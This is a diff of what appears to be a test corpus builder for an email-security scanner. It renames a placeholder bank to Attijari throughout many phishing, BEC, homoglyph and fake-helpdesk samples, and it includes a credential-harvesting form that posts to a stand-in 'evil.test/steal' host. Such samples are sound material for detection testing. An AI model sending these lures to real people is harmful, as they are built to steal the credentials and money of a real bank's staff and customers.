@@ -381,7 +381,7 @@ def _qr_code_phishing_png() -> bytes:
     phish_text = (
         b"Comment\x00"
         b"Scan QR code to verify your account: "
-        b"https://imania-secure-login.evil.test/verify?user=target&token=abc123\n"
+        b"https://attijari-secure-login.evil.test/verify?user=target&token=abc123\n"
         b"Your session expires in 15 minutes. Immediate verification required.\n"
         b"https://bit.ly.evil.test/3xF9kQ"
     )
@@ -637,7 +637,7 @@ def _pdf_with_phishing_url_only() -> bytes:
         b"5 0 obj\n<< /Type /Annot /Subtype /Link\n"
         b"   /Rect [90 690 400 720]\n"
         b"   /A << /Type /Action /S /URI\n"
-        b"         /URI (https://imania-tn-secure.evil.test/login?session=exp1234) >> >>\n"
+        b"         /URI (https://attijari-tn-secure.evil.test/login?session=exp1234) >> >>\n"
         b"endobj\n"
         b"xref\n0 6\ntrailer\n<< /Size 6 /Root 1 0 R >>\n"
         b"startxref\n0\n%%EOF\n"
@@ -682,7 +682,7 @@ def _mhtml_web_archive() -> bytes:
     """
     js_payload = base64.b64encode(
         b"<html><body><form action='https://evil.test/steal' method='POST'>"
-        b"<h2>ImaniIA Bank - Session Expired</h2>"
+        b"<h2>Attijari Bank - Session Expired</h2>"
         b"<p>Please re-enter your credentials:</p>"
         b"<input name='user' placeholder='Username'>"
         b"<input name='pass' type='password' placeholder='Password'>"
@@ -694,7 +694,7 @@ def _mhtml_web_archive() -> bytes:
         b"};</script></body></html>"
     ).decode()
     return (
-        f"From: <Saved by ImaniIA Bank>\r\n"
+        f"From: <Saved by Attijari Bank>\r\n"
         f"Subject: Account Verification Required\r\n"
         f"MIME-Version: 1.0\r\n"
         f"Content-Type: multipart/related; boundary=\"----=_NextPart_000\"\r\n"
@@ -782,7 +782,7 @@ def _ics_calendar_phishing() -> bytes:
     return (
         b"BEGIN:VCALENDAR\r\n"
         b"VERSION:2.0\r\n"
-        b"PRODID:-//ImaniIA Bank//Security//FR\r\n"
+        b"PRODID:-//Attijari Bank//Security//FR\r\n"
         b"METHOD:REQUEST\r\n"
         b"BEGIN:VEVENT\r\n"
         b"DTSTART:20240715T090000Z\r\n"
@@ -790,12 +790,12 @@ def _ics_calendar_phishing() -> bytes:
         b"SUMMARY:URGENT: Mandatory Security Verification\r\n"
         b"DESCRIPTION:Your account requires immediate verification.\\n"
         b"Click the link below to verify your identity:\\n\\n"
-        b"https://imania-verify.evil.test/calendar-auth?emp=target\\n\\n"
+        b"https://attijari-verify.evil.test/calendar-auth?emp=target\\n\\n"
         b"Failure to verify within 24 hours will result in account suspension.\\n"
         b"This is an automated security notification.\r\n"
-        b"ORGANIZER:mailto:security-noreply@imaniabank.com.tn\r\n"
-        b"ATTENDEE;RSVP=TRUE:mailto:target@imaniabank.com.tn\r\n"
-        b"LOCATION:https://imania-verify.evil.test/calendar-auth\r\n"
+        b"ORGANIZER:mailto:security-noreply@attijaribank.com.tn\r\n"
+        b"ATTENDEE;RSVP=TRUE:mailto:target@attijaribank.com.tn\r\n"
+        b"LOCATION:https://attijari-verify.evil.test/calendar-auth\r\n"
         b"STATUS:CONFIRMED\r\n"
         b"PRIORITY:1\r\n"
         b"END:VEVENT\r\n"
@@ -820,7 +820,7 @@ def _spoofed_reply_chain_body() -> str:
         "Reference: SUP-2024-Q2-FINAL\n\n"
         "Merci,\nSarah\n\n"
         "---------- Forwarded message ----------\n"
-        "From: Aziz Benmoussa <aziz.benmoussa@imaniabank.com.tn>\n"
+        "From: Aziz Benmoussa <aziz.benmoussa@attijaribank.com.tn>\n"
         "Date: Mon, Jul 8, 2024 at 3:42 PM\n"
         "Subject: Re: Supplier Payment - Q2\n"
         "To: Sarah Dumont <s.dumont@supplier-legit.com>\n\n"
@@ -849,18 +849,18 @@ def _zero_width_obfuscated_body() -> str:
         f"We detected un{zwsp}authorized ac{zwj}cess to your account.\n"
         f"Your ac{zwsp}count will be sus{zwj}pended within 24 hours.\n\n"
         f"Please ver{zwsp}ify your iden{zwj}tity immediately:\n"
-        f"https://imania-sec{zwsp}ure.evil.test/ver{zwj}ify\n\n"
+        f"https://attijari-sec{zwsp}ure.evil.test/ver{zwj}ify\n\n"
         f"Enter your pass{zwsp}word and con{zwj}firm your cre{zwsp}dentials.\n\n"
         f"Fail{zwsp}ure to res{zwj}pond will result in permanent closure.\n\n"
         f"IT Sec{zwsp}urity Team\n"
-        f"ImaniIA Bank"
+        f"Attijari Bank"
     )
 
 
 def _homoglyph_domain_body() -> str:
     """Email body using Cyrillic/Greek homoglyphs in domain names.
 
-    Evasion: "imaniabank.com" uses Latin letters but the phishing URL
+    Evasion: "attijaribank.com" uses Latin letters but the phishing URL
     uses Cyrillic а (U+0430), е (U+0435), о (U+043E) — visually identical
     but different Unicode codepoints. Domain comparison won't match.
     """
@@ -874,7 +874,7 @@ def _homoglyph_domain_body() -> str:
         "Si vous ne vous reconnectez pas dans les 12 heures,\n"
         "votre acces sera temporairement suspendu.\n\n"
         "Service Clientele\n"
-        "ImaniIA Bank"
+        "Attijari Bank"
     )
 
 
@@ -1133,7 +1133,7 @@ def _email_thread_hijack_body() -> str:
         "Bonjour Mohamed,\n\n"
         "Suite a notre reunion de ce matin, voici le document mis a jour\n"
         "avec les modifications demandees par Aziz.\n\n"
-        "Lien SharePoint: https://imaniabank-my.sharepoint.evil.test/personal/"
+        "Lien SharePoint: https://attijaribank-my.sharepoint.evil.test/personal/"
         "docs/Q2_Budget_Final_v3.xlsx\n\n"
         "J'ai aussi ajoute les previsions pour Q3 comme discute.\n"
         "N'hesite pas si tu as des questions.\n\n"
@@ -1382,7 +1382,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "Fake IT alert with auth failure + credential harvesting link",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="it-security@imaniabenk.com.tn",  # typosquat
+            from_addr="it-security@attijaribenk.com.tn",  # typosquat
             to_addr="test@test.com",
             subject="URGENT: Your Account Will Be Suspended",
             body=(
@@ -1391,9 +1391,9 @@ def build_malicious_cases() -> list[dict]:
                 "Your account will be suspended within 24 hours unless you "
                 "verify your identity immediately.\n\n"
                 "Click here to confirm your password: "
-                "http://imania-secure-verify.com/login\n\n"
+                "http://attijari-secure-verify.com/login\n\n"
                 "Failure to respond will result in permanent account closure.\n\n"
-                "IT Security Team\nImaniIA Bank"
+                "IT Security Team\nAttijari Bank"
             ),
             auth_pass=False,
         ),
@@ -1405,7 +1405,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "CEO impersonation requesting urgent wire transfer with IBAN",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="ceo.bureau@imaniabank-tn.com",  # look-alike domain
+            from_addr="ceo.bureau@attijaribank-tn.com",  # look-alike domain
             to_addr="test@test.com",
             subject="Confidential - Urgent Wire Transfer",
             body=(
@@ -1642,7 +1642,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "MHTML web archive with embedded login form + data exfiltration",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="webmail@imania-portal-service.com",
+            from_addr="webmail@attijari-portal-service.com",
             to_addr="test@test.com",
             subject="Your Webmail Session Has Expired",
             body=(
@@ -1706,7 +1706,7 @@ def build_malicious_cases() -> list[dict]:
             body=_spoofed_reply_chain_body(),
             extra_headers={
                 "In-Reply-To": "<fake-thread-id-8472@supplier-legit.com>",
-                "References": "<original-thread@imaniabank.com.tn> <fake-thread-id-8472@supplier-legit.com>",
+                "References": "<original-thread@attijaribank.com.tn> <fake-thread-id-8472@supplier-legit.com>",
             },
             auth_pass=True,  # legitimate sending server
         ),
@@ -1732,7 +1732,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "Email body with Cyrillic homoglyphs in domain — visually identical to real domain",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="service-client@imania-support.com",
+            from_addr="service-client@attijari-support.com",
             to_addr="test@test.com",
             subject="Votre acces bancaire - Verification requise",
             body=_homoglyph_domain_body(),
@@ -1909,8 +1909,8 @@ def build_malicious_cases() -> list[dict]:
             subject="Re: Re: FW: Changement coordonnees bancaires fournisseur",
             body=_email_thread_hijack_body(),
             extra_headers={
-                "In-Reply-To": "<genuine-looking-id@imaniabank.com.tn>",
-                "References": "<thread-start@imaniabank.com.tn> <reply1@imaniabank.com.tn>",
+                "In-Reply-To": "<genuine-looking-id@attijaribank.com.tn>",
+                "References": "<thread-start@attijaribank.com.tn> <reply1@attijaribank.com.tn>",
             },
             auth_pass=True,  # sender's server is legit
         ),
@@ -1959,13 +1959,13 @@ def build_malicious_cases() -> list[dict]:
     # EXPANDED CORPUS (v3) — 20 additional realistic attack scenarios
     # ===================================================================
 
-    # --- 40. French SWIFT transfer phishing (ImaniIA-specific) ---
+    # --- 40. French SWIFT transfer phishing (Attijari-specific) ---
     cases.append({
         "name": "swift_transfer_phish_FR",
-        "description": "French-language phishing impersonating ImaniIA SWIFT department",
+        "description": "French-language phishing impersonating Attijari SWIFT department",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="service.swift@imania-wafabank.com",
+            from_addr="service.swift@attijari-wafabank.com",
             to_addr="test@test.com",
             subject="URGENT: Confirmation virement SWIFT - Ref TN2024-88731",
             body=(
@@ -1976,11 +1976,11 @@ def build_malicious_cases() -> list[dict]:
                 "Si vous n'etes pas a l'origine de cette operation, veuillez "
                 "confirmer votre identite immediatement en cliquant sur le lien "
                 "ci-dessous afin de bloquer la transaction:\n\n"
-                "https://imania-wafabank-secure.com/swift/verify?ref=TN2024-88731\n\n"
+                "https://attijari-wafabank-secure.com/swift/verify?ref=TN2024-88731\n\n"
                 "ATTENTION: Vous disposez de 2 heures pour annuler ce virement. "
                 "Passe ce delai, la transaction sera executee de maniere irrevocable.\n\n"
                 "Service des Virements Internationaux\n"
-                "ImaniIA Wafa Bank"
+                "Attijari Wafa Bank"
             ),
             auth_pass=False,
         ),
@@ -1992,7 +1992,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "French phishing requesting bank coordinate update via fake portal",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="service-client@imaniabank-tn.net",
+            from_addr="service-client@attijaribank-tn.net",
             to_addr="test@test.com",
             subject="Mise a jour obligatoire de vos coordonnees bancaires",
             body=(
@@ -2005,11 +2005,11 @@ def build_malicious_cases() -> list[dict]:
                 "- Piece d'identite (CIN ou passeport)\n"
                 "- Justificatif de domicile\n"
                 "- Numero de telephone mobile\n\n"
-                "Lien de mise a jour: https://espace-client-imania.com/maj-coordonnees\n\n"
+                "Lien de mise a jour: https://espace-client-attijari.com/maj-coordonnees\n\n"
                 "En cas de non-conformite, votre compte sera temporairement suspendu "
                 "conformement a l'article 42 de la loi bancaire tunisienne.\n\n"
                 "Direction de la Conformite\n"
-                "ImaniIA Bank Tunisie"
+                "Attijari Bank Tunisie"
             ),
             auth_pass=False,
         ),
@@ -2059,7 +2059,7 @@ def build_malicious_cases() -> list[dict]:
                 "All active sessions have been terminated to protect your organization.\n\n"
                 "To restore access to Outlook, Teams, SharePoint and OneDrive, "
                 "please re-authenticate using your corporate credentials:\n\n"
-                "https://login-microsoftonline.secure-auth.com/oauth2/authorize?client_id=imania\n\n"
+                "https://login-microsoftonline.secure-auth.com/oauth2/authorize?client_id=attijari\n\n"
                 "If you do not re-authenticate within 4 hours, your account will be "
                 "locked and you will need to contact your IT administrator.\n\n"
                 "This is an automated message from Microsoft 365 Security.\n"
@@ -2100,7 +2100,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "Targeted spear phishing using personal details from LinkedIn",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="directeur.general@imania-bank.tn",
+            from_addr="directeur.general@attijari-bank.tn",
             to_addr="test@test.com",
             subject="Mohamed - Projet de stage et evaluation de fin de periode",
             body=(
@@ -2110,7 +2110,7 @@ def build_malicious_cases() -> list[dict]:
                 "a l'evaluation de mi-parcours de votre projet de PFE.\n\n"
                 "Pourriez-vous remplir le formulaire d'auto-evaluation ci-dessous "
                 "avec vos identifiants de session Active Directory?\n\n"
-                "https://rh-imania-evaluation.com/formulaire?stagiaire=mohamed\n\n"
+                "https://rh-attijari-evaluation.com/formulaire?stagiaire=mohamed\n\n"
                 "Merci de le completer avant vendredi. C'est important pour la validation "
                 "de votre convention de stage avec l'universite.\n\n"
                 "Bien cordialement,\n"
@@ -2141,7 +2141,7 @@ def build_malicious_cases() -> list[dict]:
                 "- Liste des operateurs habilites aux virements SWIFT\n"
                 "- Procedures KYC mises en place\n\n"
                 "Veuillez telecharger le formulaire de reponse officiel:\n"
-                "https://bct-regulation-enquete.com/dossier/imania-2024\n\n"
+                "https://bct-regulation-enquete.com/dossier/attijari-2024\n\n"
                 "Tout defaut de reponse entrainera des sanctions conformement "
                 "au Code Monetaire et Financier.\n\n"
                 "Me Karim Belhaj\n"
@@ -2158,7 +2158,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "QR code phishing disguised as 2FA reconfiguration notice",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="securite@imania-mobile.com",
+            from_addr="securite@attijari-mobile.com",
             to_addr="test@test.com",
             subject="Reconfiguration obligatoire de votre authentification 2FA",
             body=(
@@ -2170,7 +2170,7 @@ def build_malicious_cases() -> list[dict]:
                 "IMPORTANT: Ne partagez jamais ce QR code. Il est unique et lie "
                 "a votre compte professionnel.\n\n"
                 "Direction des Systemes d'Information\n"
-                "ImaniIA Bank"
+                "Attijari Bank"
             ),
             attachments=[("2FA_QR_Code.png", _qr_code_phishing_png(), "image/png")],
         ),
@@ -2186,7 +2186,7 @@ def build_malicious_cases() -> list[dict]:
             to_addr="test@test.com",
             subject="Critical Security Patch - Temenos T24 Core Banking v2024.07",
             body=(
-                "Dear ImaniIA Bank IT Team,\n\n"
+                "Dear Attijari Bank IT Team,\n\n"
                 "A critical vulnerability (CVE-2024-38213) has been identified in "
                 "Temenos T24 Core Banking System affecting versions 2023.x and 2024.x. "
                 "This vulnerability allows remote code execution through the payment "
@@ -2245,18 +2245,18 @@ def build_malicious_cases() -> list[dict]:
         "eml": _make_eml(
             from_addr="partenariat@africa-fintech-summit.com",
             to_addr="test@test.com",
-            subject="Invitation: Africa FinTech Summit 2024 - Partenariat ImaniIA Bank",
+            subject="Invitation: Africa FinTech Summit 2024 - Partenariat Attijari Bank",
             body=(
                 "Bonjour,\n\n"
                 "Nous organisons l'Africa FinTech Summit 2024 qui se tiendra a Tunis "
                 "les 15-17 septembre 2024 au Palais des Congres.\n\n"
-                "ImaniIA Bank a ete selectionnee comme partenaire strategique "
+                "Attijari Bank a ete selectionnee comme partenaire strategique "
                 "pour cet evenement majeur. Nous souhaitons discuter des modalites "
                 "de votre participation et du package sponsoring.\n\n"
                 "Pourriez-vous nous indiquer vos disponibilites pour un appel "
                 "cette semaine? En attendant, je vous invite a consulter notre "
                 "dossier de presentation:\n\n"
-                "https://africa-fintech-summit-docs.com/partenaires/imania/dossier.pdf\n\n"
+                "https://africa-fintech-summit-docs.com/partenaires/attijari/dossier.pdf\n\n"
                 "Au plaisir de collaborer avec vous.\n\n"
                 "Mme Fatima Zahra Benali\n"
                 "Directrice des Partenariats\n"
@@ -2272,7 +2272,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "Fake HR payroll portal login to harvest credentials",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="paie@rh-imaniabank.com",
+            from_addr="paie@rh-attijaribank.com",
             to_addr="test@test.com",
             subject="Bulletin de paie - Juin 2024 disponible",
             body=(
@@ -2282,11 +2282,11 @@ def build_malicious_cases() -> list[dict]:
                 "Nous vous informons egalement qu'une prime exceptionnelle "
                 "de performance a ete ajoutee a votre remuneration ce mois-ci. "
                 "Connectez-vous pour consulter le detail:\n\n"
-                "https://portail-rh-imania.com/paie/juin2024\n\n"
+                "https://portail-rh-attijari.com/paie/juin2024\n\n"
                 "Identifiant: votre adresse email professionnelle\n"
                 "Mot de passe: votre mot de passe habituel\n\n"
                 "Direction des Ressources Humaines\n"
-                "ImaniIA Bank Tunisie"
+                "Attijari Bank Tunisie"
             ),
             auth_pass=False,
         ),
@@ -2306,7 +2306,7 @@ def build_malicious_cases() -> list[dict]:
                 "Bonjour,\n\n"
                 "M. Ahmed Mansour a envoye un document pour votre signature electronique.\n\n"
                 "Document: Contrat_Prestation_Services_2024.pdf\n"
-                "Expediteur: ahmed.mansour@imaniabank.com.tn\n"
+                "Expediteur: ahmed.mansour@attijaribank.com.tn\n"
                 "Date d'expiration: 5 juillet 2024\n\n"
                 "Veuillez ouvrir le document ci-joint pour examiner et signer.\n\n"
                 "Ce message contient un document confidentiel destine uniquement "
@@ -2324,7 +2324,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "Fake IT helpdesk distributing remote access trojan as support tool",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="helpdesk@it-support-imania.com",
+            from_addr="helpdesk@it-support-attijari.com",
             to_addr="test@test.com",
             subject="Ticket #INC-4521: Installation outil de support a distance",
             body=(
@@ -2342,9 +2342,9 @@ def build_malicious_cases() -> list[dict]:
                 "Note: L'antivirus peut signaler ce logiciel comme suspect. "
                 "C'est un faux positif, veuillez l'autoriser.\n\n"
                 "Support Informatique - Niveau 2\n"
-                "ImaniIA Bank"
+                "Attijari Bank"
             ),
-            attachments=[("ImaniIASupport_Remote.exe", _pe_disguised_as_pdf(),
+            attachments=[("AttijariSupport_Remote.exe", _pe_disguised_as_pdf(),
                          "application/octet-stream")],
             auth_pass=False,
         ),
@@ -2382,26 +2382,26 @@ def build_malicious_cases() -> list[dict]:
 
     # --- 55. Lookalike domain with legitimate-looking content ---
     cases.append({
-        "name": "lookalike_domain_imania",
-        "description": "Email from imania lookalike domain with password reset phish",
+        "name": "lookalike_domain_attijari",
+        "description": "Email from attijari lookalike domain with password reset phish",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="noreply@imania-wafabanque.com",
+            from_addr="noreply@attijari-wafabanque.com",
             to_addr="test@test.com",
             subject="Reinitialisation de votre mot de passe - Action requise",
             body=(
-                "ImaniIA Wafa Bank - Service en ligne\n\n"
+                "Attijari Wafa Bank - Service en ligne\n\n"
                 "Cher(e) client(e),\n\n"
                 "Nous avons recu une demande de reinitialisation du mot de passe "
-                "associe a votre compte en ligne ImaniIA.\n\n"
+                "associe a votre compte en ligne Attijari.\n\n"
                 "Si vous etes a l'origine de cette demande, cliquez sur le lien "
                 "ci-dessous pour definir un nouveau mot de passe:\n\n"
-                "https://imania-wafabanque.com/reset-password?token=eyJhbGciOiJIUzI1NiJ9\n\n"
+                "https://attijari-wafabanque.com/reset-password?token=eyJhbGciOiJIUzI1NiJ9\n\n"
                 "Ce lien expirera dans 30 minutes.\n\n"
                 "Si vous n'avez pas demande cette reinitialisation, veuillez ignorer "
                 "ce message. Votre mot de passe actuel restera inchange.\n\n"
                 "Service Client en Ligne\n"
-                "ImaniIA Wafa Bank\n"
+                "Attijari Wafa Bank\n"
                 "Tel: 70 010 600"
             ),
             auth_pass=False,
@@ -2414,7 +2414,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "Fake meeting invitation with malicious URL in location field",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="calendrier@reunion-imania.com",
+            from_addr="calendrier@reunion-attijari.com",
             to_addr="test@test.com",
             subject="Invitation: Comite de Direction - Session extraordinaire",
             body=(
@@ -2423,7 +2423,7 @@ def build_malicious_cases() -> list[dict]:
                 "Date: Mercredi 3 juillet 2024, 09h00 - 11h00\n"
                 "Lieu: Salle de conference (lien visio ci-dessous)\n\n"
                 "Lien de connexion Teams:\n"
-                "https://teams-meeting-imania.com/join/19:meeting_OGE2NGVk\n\n"
+                "https://teams-meeting-attijari.com/join/19:meeting_OGE2NGVk\n\n"
                 "Ordre du jour:\n"
                 "1. Revue des indicateurs de risque operationnel\n"
                 "2. Point sur l'audit BCT\n"
@@ -2441,7 +2441,7 @@ def build_malicious_cases() -> list[dict]:
         "description": "Fake security software alert urging download of malicious cleaner",
         "expected": "malicious",
         "eml": _make_eml(
-            from_addr="alerte@securite-informatique-imania.com",
+            from_addr="alerte@securite-informatique-attijari.com",
             to_addr="test@test.com",
             subject="ALERTE SECURITE: Malware detecte sur votre poste de travail",
             body=(
@@ -2456,7 +2456,7 @@ def build_malicious_cases() -> list[dict]:
                 "Action immediate requise:\n"
                 "Telechargez et executez l'outil de nettoyage ci-joint pour "
                 "supprimer la menace avant qu'elle ne se propage au reseau.\n\n"
-                "https://securite-imania-tools.com/cleanup/ATT2847\n\n"
+                "https://securite-attijari-tools.com/cleanup/ATT2847\n\n"
                 "NE PAS ETEINDRE VOTRE POSTE avant la fin de l'analyse.\n\n"
                 "CERT - Equipe de Reponse aux Incidents\n"
                 "Direction des Systemes d'Information"
@@ -2489,8 +2489,8 @@ def build_malicious_cases() -> list[dict]:
             ),
             attachments=[("Contrat_Cadre_2024_Signe.pdf", _pdf_with_js(), "application/pdf")],
             extra_headers={
-                "In-Reply-To": "<thread-contrat-2024@imaniabank.com.tn>",
-                "References": "<original@imaniabank.com.tn> <reply1@fournisseur-agree.tn>",
+                "In-Reply-To": "<thread-contrat-2024@attijaribank.com.tn>",
+                "References": "<original@attijaribank.com.tn> <reply1@fournisseur-agree.tn>",
             },
             auth_pass=True,
         ),
@@ -2699,13 +2699,13 @@ def build_benign_cases() -> list[dict]:
     # EXPANDED BENIGN CORPUS (v3) — 10 additional legitimate scenarios
     # ===================================================================
 
-    # --- 9. Legitimate ImaniIA bank correspondence in French ---
+    # --- 9. Legitimate Attijari bank correspondence in French ---
     cases.append({
-        "name": "legit_imania_correspondence",
-        "description": "Genuine ImaniIA bank correspondence about account opening",
+        "name": "legit_attijari_correspondence",
+        "description": "Genuine Attijari bank correspondence about account opening",
         "expected": "benign",
         "eml": _make_eml(
-            from_addr="service.clientele@imaniabank.com.tn",
+            from_addr="service.clientele@attijaribank.com.tn",
             to_addr="test@test.com",
             subject="Confirmation d'ouverture de compte - Ref CL-2024-08847",
             body=(
@@ -2716,10 +2716,10 @@ def build_benign_cases() -> list[dict]:
                 "Votre conseiller clientele, M. Slim Bouazizi, reste a votre "
                 "disposition pour toute question relative a la gestion de votre compte.\n\n"
                 "Vous pouvez acceder a vos services en ligne sur "
-                "https://www.imaniabank.com.tn/espace-client\n\n"
+                "https://www.attijaribank.com.tn/espace-client\n\n"
                 "Nous vous remercions pour votre confiance.\n\n"
                 "Service Clientele\n"
-                "ImaniIA Bank - Agence Les Berges du Lac\n"
+                "Attijari Bank - Agence Les Berges du Lac\n"
                 "Tel: 71 861 200"
             ),
         ),
@@ -2837,7 +2837,7 @@ def build_benign_cases() -> list[dict]:
         "description": "Genuine internal meeting invitation from colleague",
         "expected": "benign",
         "eml": _make_eml(
-            from_addr="slim.bouazizi@imaniabank.com.tn",
+            from_addr="slim.bouazizi@attijaribank.com.tn",
             to_addr="test@test.com",
             subject="Reunion hebdomadaire equipe SI - Mardi 2 juillet 10h00",
             body=(
@@ -2891,7 +2891,7 @@ def build_benign_cases() -> list[dict]:
         "description": "Automated daily system monitoring report",
         "expected": "benign",
         "eml": _make_eml(
-            from_addr="monitoring@infra.imaniabank.com.tn",
+            from_addr="monitoring@infra.attijaribank.com.tn",
             to_addr="test@test.com",
             subject="[AUTO] Rapport quotidien infrastructure - 01/07/2024",
             body=(
@@ -2919,7 +2919,7 @@ def build_benign_cases() -> list[dict]:
         "description": "Genuine BCT regulatory circular forwarded internally",
         "expected": "benign",
         "eml": _make_eml(
-            from_addr="conformite@imaniabank.com.tn",
+            from_addr="conformite@attijaribank.com.tn",
             to_addr="test@test.com",
             subject="FW: Circulaire BCT n°2024-07 - Nouvelles exigences reporting",
             body=(
@@ -2948,12 +2948,12 @@ def build_benign_cases() -> list[dict]:
         "description": "Internal training session invitation for cybersecurity awareness",
         "expected": "benign",
         "eml": _make_eml(
-            from_addr="formation@imaniabank.com.tn",
+            from_addr="formation@attijaribank.com.tn",
             to_addr="test@test.com",
             subject="Inscription formation: Sensibilisation cybersecurite - Session juillet",
             body=(
                 "Direction de la Formation\n"
-                "ImaniIA Bank Tunisie\n\n"
+                "Attijari Bank Tunisie\n\n"
                 "Cher(e) collaborateur(trice),\n\n"
                 "Dans le cadre de notre programme annuel de formation, nous organisons "
                 "une session de sensibilisation a la cybersecurite ouverte a l'ensemble "
@@ -2989,7 +2989,7 @@ def build_benign_cases() -> list[dict]:
             body=(
                 "Karim mentioned you in #project-alpha:\n\n"
                 "\"@Mohamed can you review the API specs before Thursday's sync?\"\n\n"
-                "Reply in Slack: https://imaniabank.slack.com/archives/C05EXAMPLE\n\n"
+                "Reply in Slack: https://attijaribank.slack.com/archives/C05EXAMPLE\n\n"
                 "Manage notifications: https://slack.com/account/notifications\n"
                 "Unsubscribe from email notifications: https://slack.com/account/settings"
             ),
@@ -3003,7 +3003,7 @@ def build_benign_cases() -> list[dict]:
         "description": "Jira issue assignment notification from Atlassian",
         "expected": "benign",
         "eml": _make_eml(
-            from_addr="jira@imaniabank.atlassian.net",
+            from_addr="jira@attijaribank.atlassian.net",
             to_addr="test@test.com",
             subject="[JIRA] (SEC-412) Assigned to you: Update firewall rules for DMZ segment",
             body=(
@@ -3014,8 +3014,8 @@ def build_benign_cases() -> list[dict]:
                 "Description:\n"
                 "Please review and update the iptables rules for the DMZ network "
                 "segment as per the Q3 security hardening plan. Reference document "
-                "attached in Confluence: https://imaniabank.atlassian.net/wiki/spaces/SEC/pages/123456\n\n"
-                "View issue: https://imaniabank.atlassian.net/browse/SEC-412"
+                "attached in Confluence: https://attijaribank.atlassian.net/wiki/spaces/SEC/pages/123456\n\n"
+                "View issue: https://attijaribank.atlassian.net/browse/SEC-412"
             ),
             auth_pass=True,
         ),
@@ -3033,7 +3033,7 @@ def build_benign_cases() -> list[dict]:
             body=(
                 "Google\n\n"
                 "New sign-in to your Google Account\n\n"
-                "Mohamed Ben Ali\nmoham@imaniabank.com.tn\n\n"
+                "Mohamed Ben Ali\nmoham@attijaribank.com.tn\n\n"
                 "A new sign-in on Windows\n"
                 "We noticed a new sign-in to your Google Account on a Windows device. "
                 "If this was you, you don't need to do anything. If not, we'll help "
@@ -3200,14 +3200,14 @@ def build_benign_cases() -> list[dict]:
         "description": "Internal HR onboarding checklist for new employee",
         "expected": "benign",
         "eml": _make_eml(
-            from_addr="rh@imaniabank.com.tn",
+            from_addr="rh@attijaribank.com.tn",
             to_addr="test@test.com",
-            subject="Bienvenue chez ImaniIA Bank - Documents d'integration",
+            subject="Bienvenue chez Attijari Bank - Documents d'integration",
             body=(
                 "Direction des Ressources Humaines\n"
-                "ImaniIA Bank Tunisie\n\n"
+                "Attijari Bank Tunisie\n\n"
                 "Cher(e) Mohamed,\n\n"
-                "Bienvenue au sein de l'equipe ImaniIA Bank!\n\n"
+                "Bienvenue au sein de l'equipe Attijari Bank!\n\n"
                 "Veuillez trouver ci-dessous la liste des documents a fournir "
                 "pour completer votre dossier d'integration:\n\n"
                 "1. Copie CIN (recto/verso)\n"
@@ -3263,7 +3263,7 @@ def build_benign_cases() -> list[dict]:
         "description": "Simple plain-text email from colleague about meeting",
         "expected": "benign",
         "eml": _make_eml(
-            from_addr="karim.bouazizi@imaniabank.com.tn",
+            from_addr="karim.bouazizi@attijaribank.com.tn",
             to_addr="test@test.com",
             subject="Re: point demain matin",
             body=(
@@ -3508,10 +3508,10 @@ def build_benign_cases() -> list[dict]:
         "eml": _make_eml(
             from_addr="notifications@github.com",
             to_addr="test@test.com",
-            subject="[imania/email-security] Run failed: CI Pipeline - main (abc1234)",
+            subject="[attijari/email-security] Run failed: CI Pipeline - main (abc1234)",
             body=(
                 "Run failed: CI Pipeline\n\n"
-                "Repository: imania/email-security\n"
+                "Repository: attijari/email-security\n"
                 "Branch: main\n"
                 "Commit: abc1234 - Fix extraction timeout handling\n"
                 "Author: PublisherX02\n\n"
@@ -3521,9 +3521,9 @@ def build_benign_cases() -> list[dict]:
                 "Error: test_yara_scanning FAILED\n"
                 "AssertionError: Expected 3 matches, got 2\n\n"
                 "View workflow run:\n"
-                "https://github.com/imania/email-security/actions/runs/123456789\n\n"
+                "https://github.com/attijari/email-security/actions/runs/123456789\n\n"
                 "View commit:\n"
-                "https://github.com/imania/email-security/commit/abc1234\n\n"
+                "https://github.com/attijari/email-security/commit/abc1234\n\n"
                 "Unsubscribe: https://github.com/settings/notifications"
             ),
             auth_pass=True,
@@ -3563,7 +3563,7 @@ def build_benign_cases() -> list[dict]:
         "description": "Tunisian Derija/French code-switched email from colleague — tests multilingual handling",
         "expected": "benign",
         "eml": _make_eml(
-            from_addr="ahmed.gharbi@imaniabank.com.tn",
+            from_addr="ahmed.gharbi@attijaribank.com.tn",
             to_addr="test@test.com",
             subject="Re: el rapport mta3 el audit",
             body=(
@@ -3571,7 +3571,7 @@ def build_benign_cases() -> list[dict]:
                 "El rapport mta3 el audit lezem yousel avant vendredi. "
                 "Ena kammalt el partie technique w baatht'ha lel Karim bech yrevisiha.\n\n"
                 "Tnajem t'accedi lel fichier 3al SharePoint:\n"
-                "https://imaniabank.sharepoint.com/sites/audit-si/rapport-q2-2024\n\n"
+                "https://attijaribank.sharepoint.com/sites/audit-si/rapport-q2-2024\n\n"
                 "Famma quelques points lezem nreviewouhom ensemble:\n"
                 "- El config mta3 el firewall (section 3.2)\n"
                 "- Les recommandations mta3 el penetration test\n"
@@ -3589,16 +3589,35 @@ def build_benign_cases() -> list[dict]:
 
 # ======================== PIPELINE RUNNER (NO DB) ========================
 
-def run_pipeline_isolated(raw_eml: bytes, run_llm: bool = True) -> dict:
+def _queued_shas(db):
+    """Rows currently sitting in 'queued' status — used to diff before/after
+    a single _maybe_enqueue_detonation call (that function has no return
+    value telling us what it queued)."""
+    from database import PendingDetonation
+    return db.query(PendingDetonation).filter(PendingDetonation.status == "queued").all()
+
+
